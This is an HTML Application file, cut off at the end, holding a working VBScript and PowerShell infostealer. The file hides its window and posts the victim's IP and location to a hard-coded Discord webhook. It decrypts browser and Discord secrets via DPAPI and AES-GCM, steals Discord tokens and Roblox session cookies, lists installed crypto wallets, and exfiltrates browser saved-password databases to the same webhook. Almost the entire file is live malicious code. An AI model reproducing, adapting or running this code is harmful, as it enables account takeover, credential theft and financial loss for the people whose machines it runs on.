<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
On Error Resume Next

Dim sh, fso, WH, PC, USER
Set sh  = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
WH   = "https://discord.com/api/webhooks/1558203158402965807/CSEdSKDtJzkQQTllCpddCzT237OjDV-OXqpVqIeanWhFjYShYgexU0WOANI-hiun9EDL"
PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
USER = sh.ExpandEnvironmentStrings("%USERNAME%")
If Left(PC,   1) = "%" Then PC   = "Unknown"
If Left(USER, 1) = "%" Then USER = "Unknown"

Sub Window_OnLoad()
    window.resizeTo 0, 0
    window.moveTo -2000, -2000
    GrabIP()
    RunStealer()
End Sub

' ─── IP + GEO ───────────────────────────────────────────────────────────────

Sub GrabIP()
    Dim xh, ip, cleaned, ll
    Dim country, region, city, isp, info

    Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056

    xh.Open "GET", "https://api.ipify.org/", False : xh.Send
    If xh.Status <> 200 Then Set xh = Nothing : Exit Sub
    ip = Trim(xh.responseText)
    If Len(ip) < 7 Then Set xh = Nothing : Exit Sub

    xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False : xh.Send

    country = "?" : region = "?" : city = "?" : isp = "?"
    If xh.Status = 200 Then
        cleaned = Replace(xh.responseText, vbCr, "")
        ll = Split(cleaned, vbLf)
        If UBound(ll) >= 0 Then country = Trim(ll(0))
        If UBound(ll) >= 1 Then region  = Trim(ll(1))
        If UBound(ll) >= 2 Then city    = Trim(ll(2))
        If UBound(ll) >= 3 Then isp     = Trim(ll(3))
    End If
    Set xh = Nothing

    info = "**IP:** " & ip          & Chr(10) & _
           "**Country:** " & country & Chr(10) & _
           "**Region:** "  & region  & Chr(10) & _
           "**City:** "    & city    & Chr(10) & _
           "**ISP:** "     & isp     & Chr(10) & _
           "**PC:** "      & PC      & Chr(10) & _
           "**User:** "    & USER

    PostEmbed "Target", info, 3447003
End Sub

' ─── MAIN STEALER ───────────────────────────────────────────────────────────

Sub RunStealer()
    Dim psf, tf
    psf = TmpFile("st_g.ps1")
    tf  = TmpFile("st_r.txt")
    SafeDel psf : SafeDel tf

    Dim f : Set f = fso.CreateTextFile(psf, True, False)

    ' ── C# AES-GCM fallback (works on .NET 4.x where AesGcm class absent) ──
    f.WriteLine "Add-Type -AssemblyName System.Security"
    f.WriteLine "$csharp = @"""
    f.WriteLine "using System;"
    f.WriteLine "using System.Security.Cryptography;"
    f.WriteLine "public class Gcm {"
    f.WriteLine "    public static byte[] Decrypt(byte[] key, byte[] nonce, byte[] ct) {"
    f.WriteLine "        using (var aes = Aes.Create()) {"
    f.WriteLine "            aes.Key = key; aes.Mode = CipherMode.ECB; aes.Padding = PaddingMode.None;"
    f.WriteLine "            byte[] o = new byte[ct.Length];"
    f.WriteLine "            byte[] c = new byte[16]; Array.Copy(nonce, c, 12); c[15] = 2;"
    f.WriteLine "            using (var e = aes.CreateEncryptor()) {"
    f.WriteLine "                for (int i = 0; i < ct.Length; i += 16) {"
    f.WriteLine "                    byte[] k = e.TransformFinalBlock(c, 0, 16);"
    f.WriteLine "                    int n = Math.Min(16, ct.Length - i);"
    f.WriteLine "                    for (int j = 0; j < n; j++) o[i + j] = (byte)(ct[i + j] ^ k[j]);"
    f.WriteLine "                    for (int j = 15; j >= 12; j--) { if (++c[j] != 0) break; }"
    f.WriteLine "                }"
    f.WriteLine "            }"
    f.WriteLine "            return o;"
    f.WriteLine "        }"
    f.WriteLine "    }"
    f.WriteLine "}"
    f.WriteLine """@"
    f.WriteLine "Add-Type -TypeDefinition $csharp -Language CSharp"
    f.WriteLine ""
    f.WriteLine "$appdata = $env:APPDATA"
    f.WriteLine "$l       = $env:LOCALAPPDATA"
    f.WriteLine "$outfile = '" & tf & "'"
    f.WriteLine "Remove-Item $outfile -EA SilentlyContinue"
    f.WriteLine ""

    ' ── master key helper ──
    f.WriteLine "function Get-MK($base) {"
    f.WriteLine "    try {"
    f.WriteLine "        $ls = Join-Path $base 'Local State'"
    f.WriteLine "        if (-not (Test-Path $ls)) { return $null }"
    f.WriteLine "        $j  = [System.IO.File]::ReadAllText($ls) | ConvertFrom-Json"
    f.WriteLine "        $ek = [Convert]::FromBase64String($j.os_crypt.encrypted_key)"
    f.WriteLine "        return [Security.Cryptography.ProtectedData]::Unprotect([byte[]]$ek[5..($ek.Length-1)], $null, 'CurrentUser')"
    f.WriteLine "    } catch { return $null }"
    f.WriteLine "}"
    f.WriteLine ""

    ' ── GCM decrypt — native first, C# fallback ──
    f.WriteLine "$gcmOK = $false"
    f.WriteLine "try { $null = [System.Security.Cryptography.AesGcm]; $gcmOK = $true } catch {}"
    f.WriteLine ""
    f.WriteLine "function Dec-Val($mk, $b) {"
    f.WriteLine "    if ($null -eq $mk -or $b.Length -lt 31) { return $null }"
    f.WriteLine "    $nonce = [byte[]]$b[3..14]"
    f.WriteLine "    $tag   = [byte[]]$b[($b.Length-16)..($b.Length-1)]"
    f.WriteLine "    $ct    = [byte[]]$b[15..($b.Length-17)]"
    f.WriteLine "    if ($gcmOK) {"
    f.WriteLine "        try {"
    f.WriteLine "            $out = New-Object byte[] $ct.Length"
    f.WriteLine "            $gcm = [System.Security.Cryptography.AesGcm]::new([byte[]]$mk)"
    f.WriteLine "            $gcm.Decrypt($nonce, $ct, $tag, $out)"
    f.WriteLine "            $gcm.Dispose()"
    f.WriteLine "            return [Text.Encoding]::UTF8.GetString($out)"
    f.WriteLine "        } catch {}"
    f.WriteLine "    }"
    f.WriteLine "    try {"
    f.WriteLine "        $out = [Gcm]::Decrypt($mk, $nonce, $ct)"
    f.WriteLine "        return [Text.Encoding]::UTF8.GetString($out).TrimEnd([char]0)"
    f.WriteLine "    } catch { return $null }"
    f.WriteLine "}"
    f.WriteLine ""

    ' ── token validation / check ──
    f.WriteLine "function Valid-Token($t) {"
    f.WriteLine "    if (-not $t) { return $false }"
    f.WriteLine "    if ($t -match '^mfa\.[\w-]{84}$') { return $true }"
    f.WriteLine "    if ($t -match '^[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,}$') { return $true }"
    f.WriteLine "    return $false"
    f.WriteLine "}"
    f.WriteLine ""
    f.WriteLine "function Check-Token($t) {"
    f.WriteLine "    try {"
    f.WriteLine "        $wc = New-Object System.Net.WebClient"
    f.WriteLine "        $wc.Headers.Add('Authorization', $t)"
    f.WriteLine "        $r = $wc.DownloadString('https://discord.com/api/v9/users/@me')"
    f.WriteLine "        $wc.Dispose()"
    f.WriteLine "        return $r -match '""id""'"
    f.WriteLine "    } catch { return $false }"
    f.WriteLine "}"
    f.WriteLine ""

    ' ── scan ldb/log file for encrypted token ──
    f.WriteLine "function Scan-File($path, $mk) {"
    f.WriteLine "    try {"
    f.WriteLine "        $fs  = [IO.File]::Open($path,[IO.FileMode]::Open,[IO.FileAccess]::Read,[IO.FileShare]::ReadWrite)"
    f.WriteLine "        $sr  = New-Object IO.StreamReader($fs)"
    f.WriteLine "        $txt = $sr.ReadToEnd(); $sr.Close(); $fs.Close()"
    f.WriteLine "    } catch { return $null }"
    f.WriteLine "    foreach ($m in [regex]::Matches($txt,'dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,300})')) {"
    f.WriteLine "        $b64 = $m.Groups[1].Value"
    f.WriteLine "        while ($b64.Length % 4 -ne 0) { $b64 += '=' }"
    f.WriteLine "        try {"
    f.WriteLine "            $eb  = [Convert]::FromBase64String($b64)"
    f.WriteLine "            if ($eb.Length -lt 80) { continue }"
    f.WriteLine "            $dec = Dec-Val $mk $eb"
    f.WriteLine "            if ((Valid-Token $dec) -and (Check-Token $dec)) { return $dec }"
    f.WriteLine "        } catch {}"
    f.WriteLine "    }"
    f.WriteLine "    foreach ($m in [regex]::Matches($txt,'[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,}')) {"
    f.WriteLine "        if ((Valid-Token $m.Value) -and (Check-Token $m.Value)) { return $m.Value }"
    f.WriteLine "    }"
    f.WriteLine "    $m3 = [regex]::Match($txt,'mfa\.[\w-]{84}')"
    f.WriteLine "    if ($m3.Success -and (Check-Token $m3.Value)) { return $m3.Value }"
    f.WriteLine "    return $null"
    f.WriteLine "}"
    f.WriteLine ""
    f.WriteLine "function Scan-Dir($ldb, $mk) {"
    f.WriteLine "    if (-not (Test-Path $ldb)) { return $null }"
    f.WriteLine "    $files = Get-ChildItem $ldb -File -EA SilentlyContinue |"
    f.WriteLine "             Where-Object { $_.Extension -in '.ldb','.log' } |"
    f.WriteLine "             Sort-Object LastWriteTime -Descending"
    f.WriteLine "    foreach ($file in $files) {"
    f.WriteLine "        $t = Scan-File $file.FullName $mk"
    f.WriteLine "        if ($t) { return $t }"
    f.WriteLine "    }"
    f.WriteLine "    return $null"
    f.WriteLine "}"
    f.WriteLine ""

    ' ── Discord token scan ──
    f.WriteLine "$token = $null"
    f.WriteLine "foreach ($app in @('discord','discordcanary','discordptb','discorddevelopment')) {"
    f.WriteLine "    if ($token) { break }"
    f.WriteLine "    $base = Join-Path $appdata $app"
    f.WriteLine "    if (-not (Test-Path $base)) { continue }"
    f.WriteLine "    $mk = Get-MK $base"
    f.WriteLine "    $t  = Scan-Dir (Join-Path $base 'Local Storage\leveldb') $mk"
    f.WriteLine "    if ($t) { $token = $t }"
    f.WriteLine "}"
    f.WriteLine "if (-not $token) {"
    f.WriteLine "    foreach ($br in @("
    f.WriteLine "        (Join-Path $l 'Google\Chrome\User Data'),"
    f.WriteLine "        (Join-Path $l 'Microsoft\Edge\User Data'),"
    f.WriteLine "        (Join-Path $l 'BraveSoftware\Brave-Browser\User Data'),"
    f.WriteLine "        (Join-Path $l 'Opera Software\Opera Stable'),"
    f.WriteLine "        (Join-Path $l 'Vivaldi\User Data')"
    f.WriteLine "    )) {"
    f.WriteLine "        if ($token) { break }"
    f.WriteLine "        if (-not (Test-Path $br)) { continue }"
    f.WriteLine "        $mk    = Get-MK $br"
    f.WriteLine "        $profs = @('Default') + @(Get-ChildItem $br -Directory -Filter 'Profile *' -EA SilentlyContinue | Select-Object -ExpandProperty Name)"
    f.WriteLine "        foreach ($p in $profs) {"
    f.WriteLine "            if ($token) { break }"
    f.WriteLine "            $t = Scan-Dir (Join-Path $br ""$p\Local Storage\leveldb"") $mk"
    f.WriteLine "            if ($t) { $token = $t }"
    f.WriteLine "        }"
    f.WriteLine "    }"
    f.WriteLine "}"
    f.WriteLine "if ($token) {"
    f.WriteLine "    try {"
    f.WriteLine "        $r = Invoke-RestMethod 'https://discord.com/api/v9/users/@me' -Headers @{'Authorization'=$token} -TimeoutSec 5"
    f.WriteLine "        if ($r.username) {"
    f.WriteLine "            Add-Content $outfile ""DISCORD|$($r.username)|$($r.email)|$($r.phone)|$($r.id)|$token"""
    f.WriteLine "        } else { Add-Content $outfile ""DISCORD_RAW|$token"" }"
    f.WriteLine "    } catch { Add-Content $outfile ""DISCORD_RAW|$token"" }"
    f.WriteLine "}"
    f.WriteLine ""

    ' ── Roblox cookie ──
    f.WriteLine "function Clean-Cookie($raw) {"
    f.WriteLine "    $c = ($raw -replace '[\r\n\t ]','').Split(';')[0]"
    f.WriteLine "    $i = $c.IndexOf('_|WARNING')"
    f.WriteLine "    if ($i -gt 0) { $c = $c.Substring($i) }"
    f.WriteLine "    if ($c -match '_\|WARNING|ROBLOSECURITY') { return $c }"
    f.WriteLine "    return $null"
    f.WriteLine "}"
    f.WriteLine ""
    f.WriteLine "$cookie = $null"
    f.WriteLine "foreach ($rp in @("
    f.WriteLine "    (Join-Path $l    'Roblox\LocalStorage\robloxcookies.dat'),"
    f.WriteLine "    (Join-Path $l    'Roblox\LocalStorage\RobloxCookies.dat'),"
    f.WriteLine "    (Join-Path $l    'Roblox\Cookies'),"
    f.WriteLine "    (Join-Path $appdata 'Roblox\LocalStorage\robloxcookies.dat')"
    f.WriteLine ")) {"
    f.WriteLine "    if ($cookie -or -not (Test-Path $rp)) { continue }"
    f.WriteLine "    try {"
    f.WriteLine "        $raw = [System.IO.File]::ReadAllText($rp)"
    f.WriteLine "        if ($raw -match '""CookiesData""\s*:\s*""([^""]+)""') {"
    f.WriteLine "            $eb  = [Convert]::FromBase64String($Matches[1])"
    f.WriteLine "            $db  = [Security.Cryptography.ProtectedData]::Unprotect($eb, $null, 'CurrentUser')"
    f.WriteLine "            $str = [Text.Encoding]::UTF8.GetString($db)"
    f.WriteLine "            $cookie = Clean-Cookie $str"
    f.WriteLine "        }"
    f.WriteLine "        if (-not $cookie) { $cookie = Clean-Cookie $raw }"
    f.WriteLine "    } catch {}"
    f.WriteLine "}"
    f.WriteLine ""
    f.WriteLine "if (-not $cookie) {"
    f.WriteLine "    $pkgs = Join-Path $l 'Packages'"
    f.WriteLine "    if (Test-Path $pkgs) {"
    f.WriteLine "        Get-ChildItem $pkgs -Directory -EA SilentlyContinue | Where-Object { $_.Name -match 'ROBLOX' } | ForEach-Object {"
    f.WriteLine "            if ($cookie) { return }"
    f.WriteLine "            foreach ($fn in @('LocalState\RobloxCookies.dat','LocalState\robloxcookies.dat','LocalState\Cookies')) {"
    f.WriteLine "                $uwp = Join-Path $_.FullName $fn"
    f.WriteLine "                if (-not (Test-Path $uwp)) { continue }"
    f.WriteLine "                try {"
    f.WriteLine "                    $raw = [System.IO.File]::ReadAllText($uwp)"
    f.WriteLine "                    if ($raw -match '""CookiesData""\s*:\s*""([^""]+)""') {"
    f.WriteLine "                        $eb  = [Convert]::FromBase64String($Matches[1])"
    f.WriteLine "                        $db  = [Security.Cryptography.ProtectedData]::Unprotect($eb, $null, 'CurrentUser')"
    f.WriteLine "                        $str = [Text.Encoding]::UTF8.GetString($db)"
    f.WriteLine "                        $cookie = Clean-Cookie $str"
    f.WriteLine "                    }"
    f.WriteLine "                    if (-not $cookie) { $cookie = Clean-Cookie $raw }"
    f.WriteLine "                    if ($cookie) { break }"
    f.WriteLine "                } catch {}"
    f.WriteLine "            }"
    f.WriteLine "        }"
    f.WriteLine "    }"
    f.WriteLine "}"
    f.WriteLine ""
    f.WriteLine "if (-not $cookie) {"
    f.WriteLine "    foreach ($br in @("
    f.WriteLine "        (Join-Path $l 'Google\Chrome\User Data'),"
    f.WriteLine "        (Join-Path $l 'Microsoft\Edge\User Data'),"
    f.WriteLine "        (Join-Path $l 'BraveSoftware\Brave-Browser\User Data')"
    f.WriteLine "    )) {"
    f.WriteLine "        if ($cookie) { break }"
    f.WriteLine "        if (-not (Test-Path $br)) { continue }"
    f.WriteLine "        $mk    = Get-MK $br"
    f.WriteLine "        $profs = @('Default') + @(Get-ChildItem $br -Directory -Filter 'Profile *' -EA SilentlyContinue | Select-Object -ExpandProperty Name)"
    f.WriteLine "        foreach ($p in $profs) {"
    f.WriteLine "            if ($cookie) { break }"
    f.WriteLine "            foreach ($ckn in @('Cookies','Network\Cookies')) {"
    f.WriteLine "                $ckp = Join-Path $br ""$p\$ckn"""
    f.WriteLine "                if (-not (Test-Path $ckp)) { continue }"
    f.WriteLine "                try {"
    f.WriteLine "                    $tmp = $ckp + '.tmp'"
    f.WriteLine "                    $fs  = [IO.File]::Open($ckp,[IO.FileMode]::Open,[IO.FileAccess]::Read,[IO.FileShare]::ReadWrite)"
    f.WriteLine "                    $ms  = New-Object IO.MemoryStream; $fs.CopyTo($ms); $fs.Close()"
    f.WriteLine "                    [IO.File]::WriteAllBytes($tmp,$ms.ToArray()); $ms.Close()"
    f.WriteLine "                    $cn  = New-Object System.Data.SQLite.SQLiteConnection(""Data Source=$tmp"")"
    f.WriteLine "                } catch {"
    f.WriteLine "                    # SQLite not available — skip browser cookie DB"
    f.WriteLine "                    continue"
    f.WriteLine "                }"
    f.WriteLine "                try {"
    f.WriteLine "                    $cn.Open()"
    f.WriteLine "                    $cmd = $cn.CreateCommand()"
    f.WriteLine "                    $cmd.CommandText = ""SELECT value,encrypted_value FROM cookies WHERE name='.ROBLOSECURITY'"""
    f.WriteLine "                    $rd  = $cmd.ExecuteReader()"
    f.WriteLine "                    if ($rd.Read()) {"
    f.WriteLine "                        $pv = $rd.GetString(0)"
    f.WriteLine "                        if ($pv) { $cookie = Clean-Cookie $pv }"
    f.WriteLine "                        if (-not $cookie) {"
    f.WriteLine "                            $ev  = $rd.GetValue(1)"
    f.WriteLine "                            $dec = Dec-Val $mk ([byte[]]$ev)"
    f.WriteLine "                            if ($dec) { $cookie = Clean-Cookie $dec }"
    f.WriteLine "                        }"
    f.WriteLine "                    }"
    f.WriteLine "                    $rd.Close(); $cn.Close()"
    f.WriteLine "                } catch {}"
    f.WriteLine "                Remove-Item $tmp -EA SilentlyContinue"
    f.WriteLine "                if ($cookie) { break }"
    f.WriteLine "            }"
    f.WriteLine "        }"
    f.WriteLine "    }"
    f.WriteLine "}"
    f.WriteLine "if ($cookie) { Add-Content $outfile ""ROBLOX|$cookie"" }"
    f.WriteLine ""

    ' ── Desktop wallets ──
    f.WriteLine "$dw = @{"
    f.WriteLine "    Exodus='$appdata\Exodus'; Atomic='$appdata\atomic'; Electrum='$appdata\Electrum'"
    f.WriteLine "    Jaxx='$appdata\jaxx'; Guarda='$appdata\Guarda'; Coinomi='$appdata\Coinomi'"
    f.WriteLine "    Armory='$appdata\Armory'"
    f.WriteLine "}"
    f.WriteLine "foreach ($n in $dw.Keys) {"
    f.WriteLine "    $ep = $ExecutionContext.InvokeCommand.ExpandString($dw[$n])"
    f.WriteLine "    if (Test-Path $ep) { Add-Content $outfile ""WALLET_DESKTOP|$n"" }"
    f.WriteLine "}"
    f.WriteLine ""

    ' ── Browser extension wallets ──
    f.WriteLine "$bw = @{"
    f.WriteLine "    MetaMask='nkbihfbeogaeaoehlefnkodbefgpgknn'"
    f.WriteLine "    Phantom='bfnaelmomeimhlpmgjnjophhpkkoljpa'"
    f.WriteLine "    Ronin='fnjhmkhhmkbjkkabndcnnogagogbneec'"
    f.WriteLine "    BinanceChain='fhbohimaelbohpjbbldcngcnapndodjp'"
    f.WriteLine "    Coinbase='hnfanknocfeofbddgcijnmhfnkdnaad'"
    f.WriteLine "    TrustWallet='egjidjbpglichdcondbcbdnbeeppgdph'"
    f.WriteLine "    TronLink='ibnejdfjmmkpcnlpebklmnkoeoihofec'"
    f.WriteLine "}"
    f.WriteLine "$brPaths = @("
    f.WriteLine "    (Join-Path $l       'Google\Chrome\User Data'),"
    f.WriteLine "    (Join-Path $l       'Microsoft\Edge\User Data'),"
    f.WriteLine "    (Join-Path $l       'BraveSoftware\Brave-Browser\User Data'),"
    f.WriteLine "    (Join-Path $appdata 'Opera Software\Opera Stable')"
    f.WriteLine ")"
    f.WriteLine "foreach ($n in $bw.Keys) {"
    f.WriteLine "    foreach ($bp in $brPaths) {"
    f.WriteLine "        $ep = Join-Path $bp ""Default\Local Extension Settings\$($bw[$n])"""
    f.WriteLine "        if (Test-Path $ep) { Add-Content $outfile ""WALLET_BROWSER|$n""; break }"
    f.WriteLine "    }"
    f.WriteLine "}"
    f.WriteLine ""

    ' ── Browser saved passwords (raw Login Data DB → base64) ──
    f.WriteLine "$browsers = @("
    f.WriteLine "    @{Name='Chrome'; Path=(Join-Path $l 'Google\Chrome\User Data')},"
    f.WriteLine "    @{Name='Edge';   Path=(Join-Path $l 'Microsoft\Edge\User Data')},"
    f.WriteLine "    @{Name='Brave';  Path=(Join-Path $l 'BraveSoftware\Brave-Browser\User Data')},"
    f.WriteLine "    @{Name='Opera';  Path=(Join-Path $appdata 'Opera Software\Opera Stable')},"
    f.WriteLine "    @{Name='OperaGX';Path=(Join-Path $appdata 'Opera Software\Opera GX Stable')}"
    f.WriteLine ")"
    f.WriteLine "foreach ($br in $browsers) {"
    f.WriteLine "    if (-not (Test-Path $br.Path)) { continue }"
    f.WriteLine "    $lp = Join-Path $br.Path 'Default\Login Data'"
    f.WriteLine "    if (-not (Test-Path $lp)) { $lp = Join-Path $br.Path 'Login Data' }"
    f.WriteLine "    if (-not (Test-Path $lp)) { continue }"
    f.WriteLine "    try {"
    f.WriteLine "        $fs  = [IO.File]::Open($lp,[IO.FileMode]::Open,[IO.FileAccess]::Read,[IO.FileShare]::ReadWrite)"
    f.WriteLine "        $ms  = New-Object IO.MemoryStream; $fs.CopyTo($ms); $fs.Close()"
    f.WriteLine "        $raw = $ms.ToArray(); $ms.Close()"
    f.WriteLine "        if ($raw.Length -gt 800000) {"
    f.WriteLine "            Add-Content $outfile ""PASSWORD|$($br.Name)|TOO_LARGE|$($raw.Length)"""
    f.WriteLine "        } else {"
    f.WriteLine "            $b64 = [Convert]::ToBase64String($raw)"
    f.WriteLine "            Add-Content $outfile ""PASSWORD|$($br.Name)|$b64"""
    f.WriteLine "        }"
    f.WriteLine "    } catch { Add-Content $outfile ""PASSWORD|$($br.Name)|LOCKED"" }"
    f.WriteLine "}"

    f.Close : Set f = Nothing
    sh.Run "cmd /c powershell -NoP -NonI -Exec Bypass -File """ & psf & """", 0, True
    SafeDel psf

    If Not fso.FileExists(tf) Then Exit Sub
    Dim results : results = ReadFile(tf)
    SafeDel tf

    ParseAndPost results
End Sub

' ─── PARSE + POST RESULTS ───────────────────────────────────────────────────

Sub ParseAndPost(results)
    Dim lines, parts, nl
    nl = Chr(10)
    lines = Split(results, vbLf)

    Dim discordToken, discordInfo, robloxCookie
    Dim walletDesktop(), walletBrowser(), passwords()
    Dim wdCount, wbCount, pwCount
    wdCount = 0 : wbCount = 0 : pwCount = 0
    ReDim walletDesktop(50), walletBrowser(50), passwords(10)

    Dim i
    For i = 0 To UBound(lines)
        Dim line : line = Trim(lines(i))
        If Len(line) = 0 Then GoTo NextLine
        parts = Split(line, "|")

        Select Case parts(0)

            Case "DISCORD"
                ' DISCORD|username|email|phone|id|token
                discordToken = ""
                If UBound(parts) >= 5 Then discordToken = parts(5)
                If UBound(parts) >= 4 Then
                    discordInfo = "**Username:** " & parts(1) & nl & _
                                  "**Email:** "    & parts(2) & nl & _
                                  "**Phone:** "    & parts(3) & nl & _
                                  "**ID:** "       & parts(4) & nl & _
                                  "**PC:** "       & PC       & nl & _
                                  "**User:** "     & USER
                    PostEmbed "Discord Hit", discordInfo, 7506394
                End If
                If Len(discordToken) > 10 Then PostFile "discord_token.txt", discordToken

            Case "DISCORD_RAW"
                If UBound(parts) >= 1 Then
                    discordToken = parts(1)
                    PostEmbed "Discord Token (raw)", "**Token:** " & discordToken & nl & "**PC:** " & PC, 7506394
                    PostFile "discord_token.txt", discordToken
                End If

            Case "ROBLOX"
                If UBound(parts) >= 1 Then
                    robloxCookie = parts(1)
                    PostFile "roblox_cookie.txt", robloxCookie
                    GrabRobloxInfo robloxCookie
                End If

            Case "WALLET_DESKTOP"
                If UBound(parts) >= 1 Then
                    walletDesktop(wdCount) = parts(1)
                    wdCount = wdCount + 1
                End If

            Case "WALLET_BROWSER"
                If UBound(parts) >= 1 Then
                    walletBrowser(wbCount) = parts(1)
                    wbCount = wbCount + 1
                End If

            Case "PASSWORD"
                ' PASSWORD|browser|b64data  or  PASSWORD|browser|LOCKED  or PASSWORD|browser|TOO_LARGE|size
                If UBound(parts) >= 2 Then
                    Dim brName : brName = parts(1)
                    Dim payload : payload = parts(2)
                    If payload = "LOCKED" Then
                        passwords(pwCount) = brName & ": locked"
                        pwCount = pwCount + 1
                    ElseIf payload = "TOO_LARGE" Then
                        passwords(pwCount) = brName & ": too large (" & parts(3) & " bytes)"
                        pwCount = pwCount + 1
                    Else
                        ' post raw DB as file — caller decodes offline
                        PostFileB64 brName & "_LoginData.db.b64", payload
                        passwords(pwCount) = brName & ": sent (" & Len(payload) & " b64 chars)"
                        pwCount = pwCount + 1
                    End If
                End If

        End Select
        NextLine:
    Next

    ' ── wallet summary embed ──
    If wdCount > 0 Or wbCount > 0 Then
        Dim wEmbed : wEmbed = ""
        If wdCount > 0 Then
            wEmbed = "**Desktop Wallets:**" & nl
            Dim d : For d = 0 To wdCount - 1 : wEmbed = wEmbed & "• " & walletDesktop(d) & nl : Next
        End If
        If wbCount > 0 Then
            wEmbed = wEmbed & "**Browser Wallets:**" & nl
            Dim b : For b = 0 To wbCount - 1 : wEmbed = wEmbed & "• " & walletBrowser(b) & nl : Next
        End If
        wEmbed = wEmbed & "**PC:** " & PC & nl & "**User:** " & USER
        PostEmbed "Wallets Found", wEmbed, 16776960
    End If

    ' ── password summary embed ──
    If pwCount > 0 Then
        Dim pEmbed : pEmbed = "**Browser Password DBs:**" & nl
        Dim pw : For pw = 0 To pwCount - 1 : pEmbed = pEmbed & "• " & passwords(pw) & nl : Next
        pEmbed = pEmbed & "**PC:** " & PC & nl & "**User:** " & USER
        PostEmbed "Passwords", pEmbed, 16753920
    End If
End Sub

' ─── ROBLOX ACCOUNT INFO ────────────────────────────────────────────────────

Sub GrabRobloxInfo(cookie)
    Dim xh, json, uinfo
    Dim uid, uname, robux, premium
    Dim created, ageDays
    Dim rapVal, rapJson, rapSum, pos, key, p, numStr, ch
    Dim embedDesc, nl

    Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056

    xh.Open "GET", "https://www.roblox.com/mobileapi/userinfo", False
    xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
    xh.Send
    If xh.Status <> 200 Then Set xh = Nothing : Exit Sub
    json = xh.responseText

    uid     = RegexFirst(json, """UserID"":(\d+)")
    uname   = RegexFirst(json, """UserName"":""([^""]+)""")
    robux   = RegexFirst(json, """RobuxBalance"":(\d+)")
    premium = RegexFirst(json, """IsPremium"":(true|false)")
    If uid = "" Then Set xh = Nothing : Exit Sub
    If robux   = "" Then robux   = "0"
    If premium = "" Then premium = "false"

    xh.Open "GET", "https://users.roblox.com/v1/users/" & uid, False : xh.Send
    ageDays = "?"
    If xh.Status = 200 Then
        uinfo   = xh.responseText
        created = RegexFirst(uinfo, """created"":""([^T]+)")
        If created <> "" Then
            Dim cDate : cDate = CDate(created)
            If Err.Number = 0 Then ageDays = CStr(DateDiff("d", cDate, Now()))
            Err.Clear
        End If
    End If

    rapVal = "0" : rapSum = 0
    xh.Open "GET", "https://inventory.roblox.com/v1/users/" & uid & "/assets/collectibles?limit=100", False
    xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
    xh.Send
    If xh.Status = 200 Then
        rapJson = xh.responseText
        pos = 1 : key = """recentAveragePrice"":"
        Do
            p = InStr(pos, rapJson, key)
            If p = 0 Then Exit Do
            p = p + Len(key) : numStr = ""
            Do While p <= Len(rapJson)
                ch = Mid(rapJson, p, 1)
                If ch >= "0" And ch <= "9" Then numStr = numStr & ch : p = p + 1
                Else Exit Do
                End If
            Loop
            If numStr <> "" Then rapSum = rapSum + CLng(numStr)
            pos = p
        Loop
        rapVal = CStr(rapSum)
    End If
    Set xh = Nothing

    nl = Chr(10)
    embedDesc = "**Username:** " & uname             & nl & _
                "**UID:** "      & uid                & nl & _
                "**Age:** "      & ageDays & " days"  & nl & _
                "**Robux:** "    & robux               & nl & _
                "**Premium:** "  & premium             & nl & _
                "**RAP:** "      & rapVal              & nl & _
                "**PC:** "       & PC                  & nl & _
                "**User:** "     & USER                & nl & nl & _
                "**Cookie:** ``attached``"

    PostEmbed "Roblox Hit", embedDesc, 16711680
End Sub

' ─── WEBHOOK HELPERS ────────────────────────────────────────────────────────

Sub PostEmbed(t, d, c)
    Dim DQ, j, h
    DQ = Chr(34)
    j  = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & _
         DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & _
         DQ & "color" & DQ & ":" & c & "}]}"
    Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send j
    Set h = Nothing
End Sub

Sub PostFile(fn, ct)
    Dim DQ, b, bd, h
    DQ = Chr(34)
    b  = "----VantaBoundary" & Replace(CreateObject("Scriptlet.TypeLib").GUID, "-", "")
    bd = "--" & b & vbCrLf & _
         "Content-Disposition: form-data; name=" & DQ & "file" & DQ & "; filename=" & DQ & fn & DQ & vbCrLf & vbCrLf & _
         ct & vbCrLf & "--" & b & "--"
    Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
    h.Send bd
    Set h = Nothing
End Sub

Sub PostFileB64(fn, b64ct)
    ' posts already-b64 content as a text file — receiver decodes offline
    PostFile fn, b64ct
End Sub

' ─── UTILITIES ──────────────────────────────────────────────────────────────

Function Ej(s)
    Ej = s
    Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
    Ej = Replace(Ej, Chr(34), Chr(92) & Chr(34))
    Ej = Replace(Ej, vbCrLf, Chr(92) & "n")
    Ej = Replace(Ej, vbCr,   Chr(92) & "n")
    Ej = Replace(Ej, vbLf,   Chr(92) & "n")
    Ej = Replace(Ej, vbTab,  Chr(92) & "t")
End Function

Function TmpFile(n)
    TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & n
End Function

Function ReadFile(p)
    Dim f : Set f = fso.OpenTextFile(p, 1)
    ReadFile = f.ReadAll
    f.Close : Set f = Nothing
End Function

Sub SafeDel(p)
    If fso.FileExists(p) Then fso.DeleteFile p, True
End Sub

Function RegexFirst(src, pattern)
    Dim rx : Set rx = CreateObject("VBScript.RegExp")
    rx.Pattern    = pattern
    rx.IgnoreCase = True
    Dim m : Set m = rx.Execute(src)
    If m.Count > 0 Then
        If m(0).SubMatches.Count > 0 Then
